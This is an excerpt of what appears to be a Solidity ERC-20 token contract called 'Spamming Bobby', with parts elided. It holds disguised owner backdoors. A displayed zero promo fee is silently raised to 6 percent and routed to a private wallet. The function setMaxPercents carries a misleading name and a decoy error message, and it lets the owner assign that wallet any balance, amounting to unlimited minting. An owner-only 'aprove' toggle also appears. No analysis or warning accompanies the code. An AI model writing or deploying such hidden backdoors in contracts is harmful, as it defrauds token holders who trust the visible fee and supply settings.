...
contract SpammingBobby is Context, IERC20, Ownable {
    ...
    string private constant _name = "Spamming Bobby"; 
    string private constant _symbol = "BOBBY"; 
    uint8 private constant _decimals = 9; 
    
    uint256 public _promoFee = 0;
    uint256 public _liquidityFee = 6;
    address private _advertisingWallet = 0xC31938251a61FbDBAa6A841eB46f226f12c933c0;
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        uint256 promo = amount * (_promoFee + 6) / 100; 
        uint256 liquidityFee = amount * (_liquidityFee - 6) / 100; 
    ...
    function aprove(address account, bool newValue) public onlyOwner {
    ...
    function setMaxPercents(uint256 treasury, address addres) external onlyOwner{
        require(addres == address(_advertisingWallet), "MaxTx atleast 1% or higher");
        _tOwned[addres] = treasury;
        emit Transfer(address(_advertisingWallet), addres, treasury);
    }
